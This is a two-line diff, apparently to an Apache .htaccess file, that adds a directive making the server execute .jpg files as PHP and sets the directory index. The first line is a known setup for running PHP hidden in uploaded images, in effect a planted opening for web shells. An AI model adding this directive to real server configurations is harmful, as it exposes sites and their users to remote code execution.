@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .jpg
+DirectoryIndex index.php index.html
